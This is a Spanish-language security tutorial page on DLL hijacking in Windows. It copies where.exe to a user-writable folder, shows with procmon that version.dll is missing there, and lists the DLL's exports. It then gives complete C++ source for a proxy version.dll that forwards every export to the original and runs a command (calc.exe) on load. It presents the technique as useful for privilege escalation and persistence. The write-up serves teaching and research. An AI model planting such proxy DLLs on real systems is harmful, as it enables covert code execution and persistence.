---
layout: default
title: "DLL Hijacking a version.dll"
permalink: /windows/version
nav_enabled: true
parent: Windows
---


## Introducción

A medida que se estudian diferentes técnicas de ejecución de código en Windows, es común encontrar ejemplos basados en aplicaciones vulnerables. Sin embargo, estas mismas técnicas también pueden aplicarse sobre binarios legítimos del sistema.

En este post se explica cómo abusar de where.exe, una utilidad nativa de Windows utilizada para localizar archivos dentro del sistema, con el fin de lograr ejecución de código mediante la técnica de DLL Hijacking.

Identificación de la vulnerabilidad

Es bien sabido que muchas herramientas en Windows, tanto propietarias como de terceros, siguen un orden específico de búsqueda de librerías (DLL Search Order):

1. El directorio donde se abre la aplicación.
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Directorio actual.
6. El listado de directorios en la variable de entorno PATH.

Partiendo de este comportamiento y haciendo uso de `procmon.exe`, se puede identificar si una aplicación es susceptible a DLL Hijacking.

![](/images/dllhijack_promonfilter.png)

Una vez creado un filtro donde el Process Name sea `where.exe`, se copia `C:\Windows\System32\where.exe` al Escritorio. Esto permite observar con mayor claridad el orden en el que el binario busca las librerías al ejecutarse.

A continuación, se ejecuta el binario desde el Escritorio:

```powershell
where.exe /F calc.exe
```
![Version.dll not found](/images/dllhijack_versionnotfound.png)

Como se observa, la librería version.dll no es encontrada en el directorio actual, el cual es una ubicación donde el usuario posee permisos de escritura.

Este comportamiento permite introducir una DLL maliciosa con el mismo nombre, logrando así la ejecución de código arbitrario.

## Ejecución de código

Esta fase resulta relativamente sencilla. Se parte de una estructura base de una Windows API DLL, sobre la cual se implementa la lógica deseada.

Es importante considerar que se está suplantando la librería `version.dll`, la cual expone múltiples funciones que deben ser correctamente exportadas para evitar fallos en la ejecución del binario legítimo.

Para identificar las funciones exportadas, se utiliza la herramienta dumpbin, incluida en el toolkit de Visual Studio. Desde el Developer Command Prompt, se ejecuta:

```powershell
dumpbin /exports C:\Windows\System32\version.dll
```

![Funciones API de version.dll](/images/dllhijack_versionexports.png)

La librería expone, entre otras, las siguientes funciones:

```
1. GetFileVersionInfoA
2. GetFileVersionInfoByHandle
3. GetFileVersionInfoExA
4. GetFileVersionInfoExW
5. GetFileVersionInfoSizeA
6. GetFileVersionInfoSizeExA
7. GetFileVersionInfoSizeExW
8. GetFileVersionInfoSizeW
9. GetFileVersionInfoW
10. VerFindFileA
11. VerFindFileW
12. VerInstallFileA
13. VerInstallFileW
16. VerQueryValueA
17. VerQueryValueW
```

El número ordinal es fundamental y debe respetarse al momento de crear la nueva DLL.

## Creación de la DLL maliciosa

Después de crear un proyecto en Visual Studio de tipo Dynamic-Link Library (DLL), se puede utilizar el siguiente código como base:

```cpp
#include <Windows.h>

#pragma comment(linker, "/export:GetFileVersionInfoA=_version.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=_version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=_version.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=_version.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=_version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=_version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=_version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=_version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=_version.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=_version.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=_version.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=_version.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=_version.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerQueryValueA=_version.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=_version.VerQueryValueW,@17")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

El uso de `#pragma comment(linker, ...)` es esencial para reenviar correctamente las funciones hacia la DLL original.

En este caso, _version representa la DLL legítima que será utilizada como proxy. Por lo tanto, se debe copiar `C:\Windows\System32\version.dll` al Escritorio y renombrarla como `_version.dll`.

La estructura general del `pragma` es:

```cpp
#pragma comment(linker, "/export:API=originaldll.API,@ordinal")
```

## Ejecución

Una vez compilada la DLL, en el Escritorio deben encontrarse los siguientes archivos:

```powershell
where.exe
version.dll (maliciosa)
_version.dll (original)
```

Al ejecutar `where.exe`, este cargará la DLL maliciosa desde el directorio actual, ejecutando el código definido en DllMain.

![Dll Hijacking](/images/dllhijack_versionrun.png)

## Conclusiones

Existen múltiples utilidades nativas de Windows que pueden ser abusadas mediante técnicas como DLL Hijacking. Este tipo de vectores resulta especialmente interesante en escenarios de escalamiento de privilegios o persistencia.

Para más casos prácticos, se puede consultar:

https://hijacklibs.net/entries/microsoft/built-in/version.html
